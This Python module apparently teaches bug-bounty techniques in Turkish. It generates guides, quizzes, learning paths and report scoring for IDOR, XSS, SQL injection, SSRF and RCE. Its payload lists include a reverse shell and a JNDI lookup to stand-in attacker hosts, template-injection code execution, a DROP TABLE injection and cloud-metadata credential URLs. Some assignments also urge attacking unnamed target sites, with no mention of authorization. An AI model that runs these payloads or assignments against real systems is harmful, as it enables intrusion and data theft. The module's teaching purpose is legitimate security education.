"""Bug Bounty tekniklerini ogreten modul.

Gunluk teknik sunumlari, adim adim rehberler, pratik odevler ve
ogrenme patikasi olusturma yetenekleri sunar.
"""

import random
from dataclasses import dataclass, field
from datetime import datetime
from typing import List, Dict, Any, Optional


@dataclass
class TechniqueGuide:
    """Teknik rehber veri yapisi."""

    name: str
    category: str       # Web, Mobile, API, Cloud, Network
    difficulty: str     # Beginner / Intermediate / Advanced / Expert
    estimated_time: str # "2 saat", "1 gun", etc.
    prerequisites: List[str] = field(default_factory=list)
    steps: List[Dict[str, str]] = field(default_factory=list)
    common_tools: List[str] = field(default_factory=list)
    payloads: List[str] = field(default_factory=list)
    checkboxes: List[str] = field(default_factory=list)
    tips: List[str] = field(default_factory=list)
    references: List[str] = field(default_factory=list)
    assignment: str = ""


@dataclass
class LearningPath:
    """Ogrenme patikasi veri yapisi."""

    title: str
    level: str          # Beginner / Intermediate / Advanced
    duration_weeks: int
    modules: List[TechniqueGuide] = field(default_factory=list)
    milestones: List[str] = field(default_factory=list)


class BountyHunterTrainer:
    """Bug bounty avcilari icin egitim ve rehberlik saglayan sinif.

    Gunluk teknik, adim adim rehber, pratik odevler ve
    kisisellestirilmis ogrenme patikalari uretir.
    """

    TECHNIQUES: Dict[str, TechniqueGuide] = {
        "idor": TechniqueGuide(
            name="IDOR (Insecure Direct Object Reference)",
            category="Web",
            difficulty="Beginner",
            estimated_time="2-3 saat",
            prerequisites=["HTTP temelleri", "URL parametreleri", "Oturum yonetimi"],
            steps=[
                {"order": "1", "title": "Hedef Belirleme",
                 "desc": "Kullanici bazli veri donduren endpoint'leri (profil, siparis, dokuman) bul."},
                {"order": "2", "title": "Parametre Analizi",
                 "desc": "Sayisal ID'ler (user_id=123, order_id=456), UUID'ler, hash'ler, slug'lari tespit et."},
                {"order": "3", "title": "Yetki Degisimi Testi",
                 "desc": "Farkli bir hesapla login ol ve diger hesabin ID'sini kendi isteginde dene."},
                {"order": "4", "title": "HTTP Metot Degisimi",
                 "desc": "GET yerine POST/PUT/DELETE dene; bazen GET'te IDOR var ama POST'ta yok."},
                {"order": "5", "title": "Encoding / Obfuscation",
                 "desc": "Base64, URL-encode, UUID varyasyonlari, negatif ID'leri (-1, 0) dene."},
                {"order": "6", "title": "Toplu Test",
                 "desc": "Intruder / ffuf ile ID araligini fuzz'la, donen farkli boyut/status kodlari not al."},
            ],
            common_tools=["Burp Suite", "ffuf", "Postman", "Browser DevTools"],
            payloads=["user_id=123", "user_id=124", "user_id=-1", "user_id=0",
                      "document_id=../../../etc/passwd"],
            checkboxes=[
                "Kullanici profili, siparis, dokuman, fatura endpoint'leri listelendi",
                "Farkli hesaplar olusturuldu (hesap A ve hesap B)",
                "ID parametreleri degistirilerek erisim test edildi",
                "UUID bypass varyasyonlari denendi",
                "Toplu fuzzing (Intruder/ffuf) calistirildi",
                "Butun response'lar kaydedildi ve karsilastirildi",
            ],
            tips=[
                "Mobil API'lerde IDOR daha yaygindir; mobil uygulamayi mutlaka incele.",
                "GraphQL endpoint'lerinde IDOR bulunabilir; query icinde baska kullanici ID'si gonder.",
                "UUID'ler guvenli gorunse bile UUID enumaration saldirisi yapilabilir.",
                "Bulk operation endpoint'leri (toplu silme, guncelleme) IDOR icin altin madendir.",
            ],
            references=[
                "https://portswigger.net/web-security/access-control/idor",
                "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html",
            ],
            assignment="Hedef bir sitede en az 2 farkli hesap olustur ve diger kullanicilarin siparis/detaylarina erismeye calis. Buldugun endpoint'leri ve ID parametrelerini raporla.",
        ),
        "xss": TechniqueGuide(
            name="Cross-Site Scripting (XSS)",
            category="Web",
            difficulty="Beginner",
            estimated_time="3-4 saat",
            prerequisites=["HTML/JavaScript temelleri", "DOM yapisi", "HTTP istek/yanit"],
            steps=[
                {"order": "1", "title": "Input Noktalarini Bul",
                 "desc": "Form, search, comment, URL parametre, header (User-Agent, Referer) gibi input alanlarini tespit et."},
                {"order": "2", "title": "Reflection Testi",
                 "desc": "Her inputa benzersiz bir string (xssTest1234) gonder ve response'ta nerede yansidigini bul."},
                {"order": "3", "title": "Context Belirleme",
                 "desc": "Yansima HTML tag, attribute, JS string, URL, CSS icinde mi? Her context farkli payload gerektirir."},
                {"order": "4", "title": "Temel Payload",
                 "desc": "HTML context: <script>alert(1)</script>; Attribute: 'onerror=alert(1); JS: ';alert(1);//"},
                {"order": "5", "title": "Filter / WAF Tespiti",
                 "desc": "Basit payload engellenirse encoding (HTML entities, URL encode, Unicode), case varyasyonlari dene."},
                {"order": "6", "title": "DOM XSS",
                 "desc": "Kaynak (source: location.hash) ve lavabo (sink: innerHTML, eval, document.write) eslesmelerini bul."},
                {"order": "7", "title": "Stored XSS",
                 "desc": "Kalici depolama alanlarinda (comment, profile bio, file name) payload'in diger kullanicilara nasil gittigini test et."},
            ],
            common_tools=["Burp Suite", "DalFox", "XSStrike", "Browser DevTools", "HTTP Request Smuggler"],
            payloads=[
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'onerror=alert(1)>",
                "<iframe src='javascript:alert(1)'>",
                "<body onload=alert(1)>",
            ],
            checkboxes=[
                "Tum input noktalari (form, URL, header) listelendi",
                "Reflected context'ler (HTML, attribute, JS, URL) belirlendi",
                "Basit alert payload'lari her context icin denendi",
                "Filter/WAF bypass varyasyonlari (encoding, case, comment) test edildi",
                "DOM kaynak ve lavabolari tespit edildi",
                "Stored XSS icin kalici alanlar test edildi",
                "CSP bypass imkanlari incelendi",
            ],
            tips=[
                "Modern tarayicilar <script>alert(1)</script>'i engelleyebilir; img/svg onerror daha guvenilir.",
                "CSP varsa 'script-src' yonergesini incele; nonce/hash tabanli ise nonce degerini calma ihtimali var mi?",
                "self-XSS'ler genellikle kabul edilmez; ancak CSRF chain ile self-XSS'i gercek XSS'e cevirme ihtimali var.",
                "DOM XSS'te kaynak -> lavabo haritalamasi yap; kaynak URL fragment, lavabo eval/innerHTML olanlari not al.",
            ],
            references=[
                "https://portswigger.net/web-security/cross-site-scripting",
                "https://owasp.org/www-community/attacks/xss/",
                "https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS",
            ],
            assignment="Hedef bir sitede en az 3 farkli context'te (HTML, attribute, JS) XSS bul. Payload'lari ve context'leri belgelendir.",
        ),
        "sqli": TechniqueGuide(
            name="SQL Injection",
            category="Web",
            difficulty="Intermediate",
            estimated_time="4-6 saat",
            prerequisites=["SQL temelleri", "HTTP istek/yanit", "Database tipleri (MySQL, PostgreSQL, MSSQL)"],
            steps=[
                {"order": "1", "title": "Injection Noktasi Bul",
                 "desc": "Form input, URL parametre, header, JSON body, GraphQL query icinde string/number concatenation olabilecek yerleri tespit et."},
                {"order": "2", "title": "Tirnak / Boolean Testi",
                 "desc": "Tek tirnak ('), cift tirnak (\"), boolean (AND 1=1 / AND 1=2) ile syntax hatasi/davranis farki ara."},
                {"order": "3", "title": "Error-based Tespit",
                 "desc": "Error mesajlarinda database tipi (MySQL, PostgreSQL, Oracle, MSSQL) ipucu ara."},
                {"order": "4", "title": "Union-based Extraction",
                 "desc": "UNION SELECT ile kolon sayisi belirle (ORDER BY, UNION SELECT NULL,...), sonra veri cek."},
                {"order": "5", "title": "Blind SQLi",
                 "desc": "Error yoksa time-based (SLEEP, BENCHMARK, pg_sleep) veya boolean-based (TRUE/FALSE response farki) kullan."},
                {"order": "6", "title": "Out-of-band Exfiltration",
                 "desc": "DNS/HTTP request ile veri disari cek: LOAD_FILE('\\\\attacker.com\\a'), xp_dirtree."},
            ],
            common_tools=["sqlmap", "Burp Suite", "Postman", "custom Python scripts"],
            payloads=[
                "' OR '1'='1",
                "' UNION SELECT NULL,NULL--",
                "' AND SLEEP(5)--",
                "' AND pg_sleep(5)--",
                "'; DROP TABLE users;--",
                "1' AND 1=1--",
                "1' AND 1=2--",
            ],
            checkboxes=[
                "Tum input noktalari SQLi icin test edildi",
                "Error mesajlarindan database tipi belirlendi",
                "Union-based kolon sayisi bulundu",
                "Boolean-based blind SQLi test edildi",
                "Time-based blind SQLi test edildi",
                "Out-of-band exfiltration imkanlari incelendi",
            ],
            tips=[
                "WAF varsa sqlmap --tamper seceneklerini kullan: space2comment, charencode, randomcase.",
                "GraphQL ve REST API'lerde SQLi unutulmamalidir; JSON icindeki string degerler SQL'e direkt gidebilir.",
                "SQLite, PostgreSQL, MSSQL'in fonksiyonlari farklidir; RCE icin LOAD_EXTENSION (SQLite) veya xp_cmdshell (MSSQL) kullanilabilir.",
                "Second-order SQLi: payload hemen islenmez, baska bir endpoint'te (rapor, guncelleme) calisir.",
            ],
            references=[
                "https://portswigger.net/web-security/sql-injection",
                "https://github.com/payloadbox/sql-injection-payload-list",
            ],
            assignment="Hedef bir uygulamada en az 1 SQLi bul. Database versiyonunu ve mevcut tablolari cek. sqlmap kullanma, manuel yap.",
        ),
        "ssrf": TechniqueGuide(
            name="Server-Side Request Forgery (SSRF)",
            category="Web",
            difficulty="Intermediate",
            estimated_time="3-5 saat",
            prerequisites=["HTTP/URL parsing", "Cloud metadata servisleri", "Internal network yapisi"],
            steps=[
                {"order": "1", "title": "URL Input Bul",
                 "desc": "URL alan form inputlari, webhook, file upload, PDF generation, image proxy endpoint'lerini bul."},
                {"order": "2", "title": "Disari Cikis Testi",
                 "desc": "Kendi sunucuna (Burp Collaborator / ngrok / interactsh) istek yollayip gelip gelmedigini kontrol et."},
                {"order": "3", "title": "IP Encoding",
                 "desc": "127.0.0.1 yerine 2130706433 (decimal), 0177.1, [::1], 127.1 gibi varyasyonlari dene."},
                {"order": "4", "title": "Redirect / DNS Rebinding",
                 "desc": "302 redirect ve DNS rebinding ile filtrelenen IP'leri atlatmaya calis."},
                {"order": "5", "title": "Cloud Metadata",
                 "desc": "169.254.169.254'e erismeye calis; AWS, GCP, Azure metadata credential'larini cek."},
                {"order": "6", "title": "Internal Service Probing",
                 "desc": "Ic agdaki servislere (Redis, Elasticsearch, Jenkins, Docker) erismeye calis."},
            ],
            common_tools=["Burp Suite", "Burp Collaborator", "interactsh", "ngrok", "ffuf"],
            payloads=[
                "http://127.0.0.1/",
                "http://[::1]/",
                "http://2130706433/",
                "http://0177.0.0.1/",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
                "dict://127.0.0.1:6379/",
            ],
            checkboxes=[
                "URL alan input noktalari listelendi",
                "Disari cikis testi (Collaborator/ngrok) basarili",
                "IP encoding varyasyonlari denendi",
                "302 redirect ve DNS rebinding test edildi",
                "Cloud metadata endpoint'lerine erisim denendi",
                "Ic agdaki servislere port taramasi yapildi",
            ],
            tips=[
                "SSRF genellikle image proxy, PDF generator, webhook gibi 'URL' isteyen fonksiyonlarda bulunur.",
                "Blind SSRF icin zaman farkli response'lar veya out-of-band istekleri kullan.",
                "gopher:// ve dict:// URL scheme'leri dahili Redis, Memcached'e erisim icin kullanilabilir.",
                "AWS IAM rol ismini metadata'dan cekip STS ile gecici credential alabilirsin.",
            ],
            references=[
                "https://portswigger.net/web-security/ssrf",
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery",
            ],
            assignment="Hedef bir uygulamada SSRF bul. En az bir cloud metadata endpoint'ine eris ve ya da ic agdaki bir servisi kesfet.",
        ),
        "idor_advanced": TechniqueGuide(
            name="Advanced IDOR & Mass Assignment",
            category="API",
            difficulty="Advanced",
            estimated_time="4-6 saat",
            prerequisites=["IDOR temelleri", "REST/GraphQL API bilgisi", "JSON mass assignment"],
            steps=[
                {"order": "1", "title": "API Endpoint Haritalama",
                 "desc": "Swagger/OpenAPI dokumani, JS kaynak kodu, mobil app trafik analizi ile tum API endpoint'lerini cikar."},
                {"order": "2", "title": "Parameter Pollution",
                 "desc": "Ayni parametreyi iki kez gonder (user_id=123&user_id=456); backend hangisini isliyor?"},
                {"order": "3", "title": "Mass Assignment",
                 "desc": "Gonderilmemesi gereken alanlari (role, is_admin, credits) body'e ekle ve guncelleme isteginde dene."},
                {"order": "4", "title": "GraphQL IDOR",
                 "desc": "GraphQL mutation/query icinde baska kullanicinin ID'si ile calistirma imkanlari ara."},
                {"order": "5", "title": "Batch Operation Abuse",
                 "desc": "Toplu silme/guncelleme endpoint'lerinde baska kullanici ID'leri ile islem yapmaya calis."},
            ],
            common_tools=["Burp Suite", "Postman", "Insomnia", "ffuf", "mitmproxy"],
            payloads=[
                "{\"user_id\": 123, \"role\": \"admin\"}",
                "{\"ids\": [1,2,3,999]} // diger kullanici ID'leri",
                "user_id[]=123&user_id[]=124",
            ],
            checkboxes=[
                "API endpoint'leri tamamiyla haritalandi",
                "Parameter pollution tum kritik parametrelerde test edildi",
                "Mass assignment alanlari tespit edildi",
                "GraphQL query/mutation ID varyasyonlari denendi",
                "Batch operation endpoint'leri farkli ID'lerle test edildi",
            ],
            tips=[
                "GraphQL introspection aciksa schema'dan tum mutation ve type'lari cek.",
                "Mobil API'lerde mass assignment cok yaygindir; mobil trafikte extra parametreler ekle.",
                "Numeric ID yerine predictability olmayan ID'ler (hash, UUID) kullanilmali ama enumaration hala mumkun.",
            ],
            references=[
                "https://portswigger.net/web-security/access-control",
                "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
            ],
            assignment="Hedef bir API'de mass assignment veya batch IDOR bul. Admin yetkisi veya baska kullanici verilerine erisim sagla.",
        ),
        "rce": TechniqueGuide(
            name="Remote Code Execution (RCE)",
            category="Web",
            difficulty="Expert",
            estimated_time="1-2 gun",
            prerequisites=["OS komutlari", "Web teknolojileri", "Deserialization", "File upload"],
            steps=[
                {"order": "1", "title": "Komut Enjeksiyonu",
                 "desc": "Ping, nslookup, dig, wget gibi shell komutu calistiran inputlari bul ve ; | && ile chain'le."},
                {"order": "2", "title": "Deserialization",
                 "desc": "Java (ysoserial), PHP (PHPGGC), Python (pickle) deserialization payload'lari ile RCE dene."},
                {"order": "3", "title": "File Upload",
                 "desc": "Web shell (PHP, JSP, ASPX), reverse shell yuklemeyi dene; mime type, extension bypass yap."},
                {"order": "4", "title": "SSRF -> RCE",
                 "desc": "SSRF ile ic agdaki Jenkins, Redis, Elasticsearch'a erisip RCE chain'i olustur."},
                {"order": "5", "title": "Template Injection (SSTI)",
                 "desc": "Jinja2, Twig, Freemarker, Velocity template engine'lerinde RCE payload'lari dene."},
            ],
            common_tools=["ysoserial", "PHPGGC", "commix", "Burp Suite", "nc", "msfvenom"],
            payloads=[
                "; cat /etc/passwd",
                "| bash -i >& /dev/tcp/attacker/4444 0>&1",
                "${jndi:ldap://attacker.com/a}",
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            ],
            checkboxes=[
                "Shell komutu calistiran input noktalari tespit edildi",
                "Deserialization payload'lari uretildi ve test edildi",
                "File upload bypass varyasyonlari denendi",
                "SSRF ile ic ag RCE imkanlari incelendi",
                "Template injection payload'lari her engine icin test edildi",
            ],
            tips=[
                "Command injection'da blind RCE icin out-of-band (DNS/HTTP) istekleri kullan.",
                "Java deserialization'da CommonsCollections, Spring, Hibernate gadget chain'lerini bil.",
                "File upload'da double extension (shell.php.jpg), null byte, mime type confusion dene.",
                "Log4j (CVE-2021-44228) tarzi JNDI injection'lar hala cok yaygindir.",
            ],
            references=[
                "https://portswigger.net/web-security/os-command-injection",
                "https://portswigger.net/web-security/deserialization",
                "https://github.com/payloadbox/rce-payload-list",
            ],
            assignment="Hedef bir uygulamada RCE bul. Calistirabildigin komutu ve etkisini raporla. Out-of-band kanit sagla.",
        ),
    }

    LEARNING_PATHS: Dict[str, LearningPath] = {
        "beginner": LearningPath(
            title="Bug Bounty Baslangic Patikasi",
            level="Beginner",
            duration_weeks=4,
            modules=[],
            milestones=[
                "HackerOne/Bugcrowd hesabi ac ve ilk programi sec",
                "10 farkli programda recon yap",
                "Ilk gecerli bug report'u gonder (Low/Medium)",
                "CVSS skorlama ve rapor yazma tekniklerini ogren",
            ],
        ),
        "intermediate": LearningPath(
            title="Bug Bounty Orta Seviye Patikasi",
            level="Intermediate",
            duration_weeks=8,
            modules=[],
            milestones=[
                "100+ programda recon ve ilk High/Critical bul",
                "API testing (REST, GraphQL) uzmanlas",
                "Otomasyon (nuclei, custom scripts) kur",
                "Bug bounty ile ilk 500$ kazan",
            ],
        ),
        "advanced": LearningPath(
            title="Bug Bounty Ileri Seviye Patikasi",
            level="Advanced",
            duration_weeks=12,
            modules=[],
            milestones=[
                "RCE, SQLi, Auth bypass gibi kritik bug'lar bul",
                "Bug chain olusturma (XSS+CSRF, SSRF+RCE)",
                "Kendi araclarini gelistir (Python/Go)",
                "Top 100 hackerone arasina gir",
            ],
        ),
    }

    def __init__(self):
        self._daily_queue = list(self.TECHNIQUES.keys())
        random.shuffle(self._daily_queue)
        self._daily_index = 0

    # ------------------------------------------------------------------
    # Daily technique
    # ------------------------------------------------------------------

    def get_daily_technique(self) -> TechniqueGuide:
        """Gunluk ogrenilecek teknik dondurur."""
        if not self._daily_queue:
            self._daily_queue = list(self.TECHNIQUES.keys())
            random.shuffle(self._daily_queue)
            self._daily_index = 0

        key = self._daily_queue[self._daily_index % len(self._daily_queue)]
        self._daily_index += 1
        return self.TECHNIQUES[key]

    def get_technique_by_name(self, name: str) -> Optional[TechniqueGuide]:
        """Isme gore teknik rehberi dondurur."""
        for key, guide in self.TECHNIQUES.items():
            if key.lower() == name.lower() or guide.name.lower() == name.lower():
                return guide
        return None

    def list_techniques(self) -> List[Dict[str, str]]:
        """Mevcut tekniklerin listesini dondurur."""
        return [
            {"key": k, "name": g.name, "category": g.category, "difficulty": g.difficulty}
            for k, g in self.TECHNIQUES.items()
        ]

    # ------------------------------------------------------------------
    # Guide generation
    # ------------------------------------------------------------------

    def generate_guide(self, technique: TechniqueGuide) -> str:
        """Teknik rehberini Markdown formatinda uretir."""
        lines = [
            f"# {technique.name}",
            "",
            f"**Kategori**: {technique.category}",
            f"**Zorluk**: {technique.difficulty}",
            f"**Tahmini Sure**: {technique.estimated_time}",
            "",
            "## Oncelikli Bilgiler (Prerequisites)",
        ]
        for pre in technique.prerequisites:
            lines.append(f"- {pre}")
        lines.append("")

        lines.append("## Adim Adim Rehber")
        for step in technique.steps:
            lines.append(f"### Adim {step['order']}: {step['title']}")
            lines.append(f"{step['desc']}")
            lines.append("")

        lines.append("## Sık Kullanılan Araclar")
        lines.append(", ".join(technique.common_tools))
        lines.append("")

        lines.append("## Ornek Payload'lar")
        for p in technique.payloads:
            lines.append(f"- `{p}`")
        lines.append("")

        lines.append("## Kontrol Listesi (Checklist)")
        for cb in technique.checkboxes:
            lines.append(f"- [ ] {cb}")
        lines.append("")

        lines.append("## Profesyonel Ipuclari")
        for tip in technique.tips:
            lines.append(f"> {tip}")
            lines.append("")

        lines.append("## Kaynaklar")
        for ref in technique.references:
            lines.append(f"- {ref}")
        lines.append("")

        lines.append("## Pratik Odev")
        lines.append(f"> {technique.assignment}")
        lines.append("")

        return "\n".join(lines)

    # ------------------------------------------------------------------
    # Learning paths
    # ------------------------------------------------------------------

    def get_learning_path(self, level: str) -> Optional[LearningPath]:
        """Seviyeye gore ogrenme patikasi dondurur."""
        return self.LEARNING_PATHS.get(level.lower())

    def generate_learning_path_plan(self, level: str) -> str:
        """Ogrenme patikasini Markdown olarak uretir."""
        path = self.get_learning_path(level)
        if not path:
            return f"'{level}' seviyesinde bir patika bulunamadi. (beginner, intermediate, advanced)"

        lines = [
            f"# {path.title}",
            "",
            f"**Seviye**: {path.level}",
            f"**Sure**: {path.duration_weeks} hafta",
            "",
            "## Kilometre Taslari (Milestones)",
        ]
        for idx, m in enumerate(path.milestones, 1):
            lines.append(f"{idx}. {m}")
        lines.append("")

        lines.append("## Haftalik Program")
        weeks = [
            ("Hafta 1-2", "Reconnaissance ve hedef haritalama. Subdomain enumeration, tech stack tespiti."),
            ("Hafta 3-4", "XSS, IDOR gibi basit web zafiyetlerine odaklan. Ilk raporlarini gonder."),
            ("Hafta 5-6", "API testing ve SQLi uzerine calis."),
            ("Hafta 7-8", "SSRF, CSRF, Auth bypass. Otomasyon araclari kur."),
            ("Hafta 9-10", "Advanced: RCE, deserialization, template injection."),
            ("Hafta 11-12", "Bug chain olusturma ve rapor kalitesini artirma."),
        ]
        for w, desc in weeks:
            lines.append(f"### {w}")
            lines.append(desc)
            lines.append("")

        lines.append("## Gunluk Calisma Rutini")
        lines.append("1. Sabah: Bugunin tekniğini calis (30 dk)")
        lines.append("2. Ogleden once: Recon veya hedef uzerinde test (2-3 saat)")
        lines.append("3. Ogleden sonra: Bulunan bug'i detaylandir ve rapor yaz (1-2 saat)")
        lines.append("4. Aksam: Hacktivity'den yeni raporlari incele ve not al (30 dk)")
        lines.append("")

        return "\n".join(lines)

    # ------------------------------------------------------------------
    # Quiz / self-check
    # ------------------------------------------------------------------

    def generate_quiz(self, technique_name: str) -> List[Dict[str, Any]]:
        """Belirli teknik icin kisa quiz sorulari uretir."""
        quizzes = {
            "idor": [
                {"q": "IDOR'da temel prensip nedir?", "a": "Baska kullanicinin kaynak ID'si ile erisim saglamak."},
                {"q": "Mass assignment nedir?", "a": "Gonderilmemesi gereken alanlari (role, is_admin) body'e ekleyerek yetki yukseltme."},
                {"q": "UUID enumaration mumkun mu?", "a": "Evet; GUID/UUID varyasyonlari, timestamp tabanli tahminlerle mumkun."},
            ],
            "xss": [
                {"q": "Reflected XSS ile Stored XSS arasindaki fark nedir?",
                 "a": "Reflected: payload hemen yanit olarak doner; Stored: payload kalici olarak depolanir."},
                {"q": "CSP bypass icin hangi teknikler kullanilir?",
                 "a": "Nonce calma, inline event handler, JSONP endpoint, script-src 'unsafe-eval' kullanimi."},
                {"q": "DOM XSS'te 'source' ve 'sink' ne anlama gelir?",
                 "a": "Source: veri girdisi (location.hash); Sink: guvensiz isleyen fonksiyon (eval, innerHTML)."},
            ],
            "sqli": [
                {"q": "Blind SQLi'da time-based ve boolean-based farki nedir?",
                 "a": "Time-based: SLEEP ile zaman farki olcer; Boolean-based: TRUE/FALSE response farki olcer."},
                {"q": "Second-order SQLi nedir?",
                 "a": "Payload hemen islenmez; baska bir endpoint'te (rapor, arama) calisir."},
            ],
            "ssrf": [
                {"q": "SSRF ile RCE nasil elde edilir?",
                 "a": "Ic agdaki Redis, Jenkins, Elasticsearch gibi servislere erisim saglanarak RCE chain olusturulur."},
                {"q": "AWS metadata servisinin IP adresi nedir?",
                 "a": "169.254.169.254"},
            ],
            "rce": [
                {"q": "Deserialization RCE hangi dillerde yaygindir?",
                 "a": "Java (ysoserial), PHP (PHPGGC), Python (pickle), .NET (ysoserial.net)."},
                {"q": "File upload RCE'da en yaygin bypass nedir?",
                 "a": "Double extension, null byte, MIME type confusion, .htaccess upload."},
            ],
        }
        return quizzes.get(technique_name.lower(), [])

    # ------------------------------------------------------------------
    # Report quality checker
    # ------------------------------------------------------------------

    def check_report_quality(self, report_text: str) -> Dict[str, Any]:
        """Bug bounty raporunun kalitesini degerlendirir."""
        text_lower = report_text.lower()
        score = 0
        feedback = []

        checks = {
            "Title is descriptive": lambda t: len(t.split("\n")[0] if "\n" in t else t) > 20,
            "Steps to reproduce": lambda t: any(k in t for k in ["step", "adim", "reproduce", "reproduction"]),
            "Impact described": lambda t: any(k in t for k in ["impact", "etki", "attacker", "saldiri"]),
            "PoC included": lambda t: any(k in t for k in ["poc", "proof", "screenshot", "payload", "curl", "request"]),
            "Recommendation provided": lambda t: any(k in t for k in ["recommend", "oneri", "fix", "cozum", "onlem"]),
            "CVSS or severity": lambda t: any(k in t for k in ["cvss", "severity", "critical", "high", "medium"]),
            "Technical detail": lambda t: len(t) > 500,
        }

        for check_name, check_fn in checks.items():
            if check_fn(text_lower):
                score += 1
            else:
                feedback.append(f"Eksik: {check_name}")

        max_score = len(checks)
        quality = "Excellent" if score >= 6 else "Good" if score >= 4 else "Needs Improvement"

        return {
            "score": score,
            "max_score": max_score,
            "quality": quality,
            "feedback": feedback,
            "tips": [
                "Raporunu basit ve anlasilir tut; gereksiz jargon kullanma.",
                "Her zaman PoC (Proof of Concept) ile birlikte gonder.",
                "Impact'i sirket perspektifinden yaz: 'Bu bug, ... nedeniyle ... riski olusturur.'",
                "Tavsiye ver: nasil duzeltilebilecegini kisa ozetle.",
            ] if score < 6 else ["Mukemmel! Rapordan emin misin? Bir kez daha gozden gecir."],
        }


# ----------------------------------------------------------------------
# Demo / CLI
# ----------------------------------------------------------------------

def _demo() -> None:
    trainer = BountyHunterTrainer()

    print("=== Gunluk Teknik ===")
    daily = trainer.get_daily_technique()
    print(trainer.generate_guide(daily))

    print("\n=== Ogrenme Patikasi (Beginner) ===")
    print(trainer.generate_learning_path_plan("beginner"))

    print("\n=== Quiz (XSS) ===")
    for q in trainer.generate_quiz("xss"):
        print(f"Soru: {q['q']}")
        print(f"Cevap: {q['a']}\n")

    print("\n=== Rapor Kalite Kontrolu ===")
    sample_report = "Title: XSS on search page\n\nSteps:\n1. Go to search\n2. Enter <script>alert(1)</script>\n3. Alert pops up\n\nImpact: attacker can steal cookies\n\nFix: encode output"
    quality = trainer.check_report_quality(sample_report)
    print(f"Puan: {quality['score']}/{quality['max_score']} - {quality['quality']}")
    for f in quality['feedback']:
        print(f"- {f}")


if __name__ == "__main__":
    _demo()
